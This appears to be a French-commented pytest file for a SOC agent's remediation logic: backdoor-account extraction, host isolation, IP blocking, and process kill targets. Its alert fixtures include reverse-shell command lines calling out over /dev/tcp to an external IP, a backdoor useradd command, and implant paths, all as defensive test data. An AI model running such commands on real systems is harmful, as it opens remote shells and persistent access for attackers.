"""Logique pure de la remédiation (sans Shuffle, Wazuh ni IRIS)."""

import json

from soc_agent import mitigate
from soc_agent.mitigate import (REMEDIATIONS, REVERSEURS, _cibles_par_machine,
                                _comptes_crees, _desc_tache, _interpreter,
                                _ip_privee, _taches_annulees)


def _alerte_proctitle(cmd: str, agent_id: str = "001") -> dict:
    """Alerte auditd portant `cmd` dans son proctitle hex (args nul-séparés)."""
    hexp = cmd.replace(" ", "\x00").encode().hex()
    return {"agent_id": agent_id, "srcip": None, "srcuser": None, "entity": None,
            "raw": json.dumps({"full_log": f"type=PROCTITLE proctitle={hexp}"})}


def test_comptes_crees_extrait_backdoor_du_proctitle():
    """Le compte créé par useradd est capté depuis le proctitle auditd (niv. 3),
    sans l'alerte syslog 5902 — c'est ce qui permet de bloquer le backdoor sans
    monter le niveau de l'alerte d'ajout d'utilisateur."""
    al = [_alerte_proctitle("useradd -m -s /bin/bash svcbackup")]
    assert _comptes_crees(al) == ["svcbackup"]
    # …et devient une cible de désactivation, sur la machine où il apparaît.
    cibles = _cibles_par_machine("propose_disable_user", {"id": 1}, al)
    assert ("001", "svcbackup") in cibles


def test_comptes_crees_exclut_comptes_proteges():
    # root / comptes système ne sont jamais des cibles de désactivation auto.
    assert _comptes_crees([_alerte_proctitle("useradd -m root")]) == []


def test_interpreter_etat_isolation():
    # Marqueur présent -> isolé.
    e = _interpreter('{"isolated": true, "since": "x"}', 0)
    assert e == {"isolated": True, "reachable": True,
                 "marker": {"isolated": True, "since": "x"}}
    # Fichier absent (stdout vide, rc non nul) -> non isolé.
    assert _interpreter("", 1) == {"isolated": False, "reachable": True,
                                   "marker": None}
    # Échec SSH -> état inconnu.
    assert _interpreter("", 255) == {"isolated": None, "reachable": False,
                                     "marker": None}
    # Marqueur illisible mais présent -> isolé, sans détail.
    e = _interpreter("corrompu", 0)
    assert e["isolated"] is True and e["marker"] is None


def test_cibles_isolation_disable_kill(monkeypatch):
    """Résolution machine par machine : chaque cible porte l'agent où la preuve
    a été observée. (Blocage d'IP testé séparément : il touche l'API assets.)"""
    monkeypatch.setattr(mitigate, "raison_non_isolable", lambda ag: None)
    inc = {"id": 1, "agent_id": "001"}
    alertes = [
        {"agent_id": "001", "srcip": "45.134.26.87", "srcuser": "jdupont",
         "entity": None, "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": "root",
         "entity": None, "raw": "{}"},
    ]
    # Isolation vise la machine (agent, agent).
    assert _cibles_par_machine("propose_isolate_host", inc, alertes) == [("001", "001")]
    # Désactivation : comptes nommés, pas les génériques (root).
    assert _cibles_par_machine("propose_disable_user", inc, alertes) == [("001", "jdupont")]


def test_block_ip_exclut_parc_et_assets_et_ordonne_public_first(monkeypatch):
    """Blocage : on écarte les subnets du parc ET les IP des agents surveillés
    (victime/pivot, jamais l'attaquant — bug purple-team du 2026-07-31 sur .46),
    et on ordonne les IP publiques d'abord. On ne réduit pas : un bruteforce
    vient de N IP, toutes bloquées."""
    monkeypatch.setattr(mitigate, "_ips_agents", lambda: {"192.168.30.46"})
    inc = {"id": 1, "agent_id": "011"}
    alertes = [
        {"agent_id": "011", "srcip": "45.134.26.87", "srcuser": None,
         "entity": None, "raw": "{}"},   # attaquant, public
        {"agent_id": "011", "srcip": "192.168.10.20", "srcuser": None,
         "entity": None, "raw": "{}"},   # subnet du parc -> écarté
        {"agent_id": "011", "srcip": "192.168.30.46", "srcuser": None,
         "entity": None, "raw": "{}"},   # IP d'un agent (victime/pivot) -> écarté
        {"agent_id": "011", "srcip": "10.8.0.9", "srcuser": None,
         "entity": None, "raw": "{}"},   # C2 privé hors parc -> bloquable
    ]
    cibles = _cibles_par_machine("propose_block_ip", inc, alertes)
    vals = [ip for _ag, ip in cibles]
    assert "192.168.10.20" not in vals          # subnet du parc
    assert "192.168.30.46" not in vals          # IP d'un agent surveillé
    assert set(vals) == {"45.134.26.87", "10.8.0.9"}
    assert vals[0] == "45.134.26.87"           # publique d'abord (ordre attaquant)


def test_block_ip_extrait_c2_du_reverse_shell(monkeypatch):
    """Le C2 d'un reverse shell /dev/tcp (execve auditd, sans srcip) devient une
    cible de blocage ; une cible /dev/tcp INTERNE (latéral) reste écartée.
    Régression case 72 (2026-07-31) : 2667 détections, 0 blocage."""
    monkeypatch.setattr(mitigate, "_ips_agents", lambda: set())
    inc = {"id": 1, "agent_id": "011"}
    alertes = [
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "rule_desc": "reverse shell",
         "raw": {"full_log": "bash -i >& /dev/tcp/45.9.1.2/4444 0>&1"}},   # C2 externe
        {"agent_id": "011", "srcip": None, "srcuser": None, "entity": None,
         "raw": {"full_log": "bash -i >& /dev/tcp/192.168.10.9/9001 0>&1"}},  # interne = latéral
    ]
    vals = [ip for _ag, ip in
            _cibles_par_machine("propose_block_ip", inc, alertes)]
    assert "45.9.1.2" in vals          # C2 externe -> bloqué
    assert "192.168.10.9" not in vals   # cible interne -> pas bloquée


def test_ip_privee_ordonne_sans_exclure():
    # _ip_privee sert au tri, pas à l'exclusion : le C2 privé du lab reste bloquable.
    assert _ip_privee("10.8.0.9") is True
    assert _ip_privee("192.168.30.46") is True
    assert _ip_privee("45.134.26.87") is False
    assert _ip_privee("pas-une-ip") is False


def test_cibles_kill_process_vise_implant_en_dir_suspect():
    """Kill : nom exact des exécutables lancés depuis /tmp, /dev/shm… ; jamais
    un binaire système légitime."""
    inc = {"id": 1, "agent_id": "001"}
    alertes = [
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/dev/shm/.kworker", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None,
         "entity": "/usr/bin/bash", "raw": "{}"},
        {"agent_id": "001", "srcip": None, "srcuser": None, "entity": None,
         "raw": json.dumps({"data": {"audit": {"exe": "/tmp/malware"}}})},
    ]
    assert _cibles_par_machine("propose_kill_process", inc, alertes) == [
        ("001", ".kworker"), ("001", "malware")]


def test_open_case_et_escalade_hors_remediation():
    assert "open_case" not in REMEDIATIONS
    assert "close_false_positive" not in REMEDIATIONS
    assert "escalate_human" not in REMEDIATIONS


def test_taches_annulees_ne_garde_que_canceled():
    """Réconciliation : seules les tâches en 'Canceled' déclenchent un reverse."""
    tasks = [
        {"task_id": 1, "status_name": "Done"},
        {"task_id": 2, "status_name": "Canceled"},
        {"task_id": 3, "status_name": "To do"},
        {"task_id": 4, "status_name": "Canceled"},
    ]
    assert _taches_annulees(tasks) == {2, 4}
    assert _taches_annulees([]) == set()
    assert _taches_annulees(None) == set()


def test_reverse_pour_actions_reversibles_pas_pour_kill():
    """Isolation, blocage IP et désactivation ont un reverse ; le kill non
    (un process tué ne se « unkill » pas)."""
    assert set(REVERSEURS) == {"propose_isolate_host", "propose_block_ip",
                               "propose_disable_user"}
    assert "propose_kill_process" not in REVERSEURS


def test_desc_tache_contient_quoi_pourquoi_annulation():
    triage = {"verdict": "true_positive", "confidence": "high",
              "reason": "Ransomware en cours."}
    desc = _desc_tache(triage, "001", "exécuté", "Shuffle",
                       "Isolation nftables.", "curl ... !host-unisolate.sh")
    assert "Ce qui a été fait" in desc
    assert "Pourquoi" in desc and "Ransomware en cours." in desc
    assert "Comment annuler" in desc and "unisolate" in desc
    assert "**Statut** : exécuté" in desc
